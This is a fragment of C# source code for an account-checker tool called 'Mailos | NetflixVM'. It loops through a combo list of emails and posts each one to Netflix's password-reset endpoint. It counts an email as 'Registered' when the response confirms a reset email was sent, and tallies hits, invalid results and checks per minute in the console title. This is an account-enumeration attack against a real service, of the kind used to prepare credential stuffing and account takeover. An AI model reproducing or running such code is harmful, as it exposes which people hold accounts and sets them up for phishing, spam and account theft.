...
namespace Ebay_Checker
{
    class netflixvm
    {
        ...
        public static void GMX()
        {
            Prsc.gmxapi();
            Export.Initialize();
            Console.Title = "Mailos | NetflixVM";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            ...
            try
            {
                ...
                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        ...
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - NetflixVM] | Registered: " + Variables.hit + " | Invalid: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });
                    ...
                    try
                    {
                        ...
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            ...
                            try
                            {
                                ...
                                httpRequest.AddHeader("Referer", "https://www.netflix.com/il-en/loginHelp");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");

                                var res0 = httpRequest.Post("https://www.netflix.com/api/shakti/v74114b55/login/help", "{\"fields\":{\"forgotPasswordChoice\":{\"value\":\"email\"},\"email\":\"" + s[0] + "\"},\"mode\":\"enterPasswordReset\",\"action\":\"nextAction\",\"authURL\":\"1585114336990.l8y9qpNQD+RLiSWdj4TdfjXFRfE=\"}", "application/json");
                                string text0 = res0.ToString();

                                if (text0.Contains("confirmPasswordResetEmailed"))
                                {
                                    Variables.hit++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                ...
                                else if (text0.Contains("mode\":\"enterPasswordReset"))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
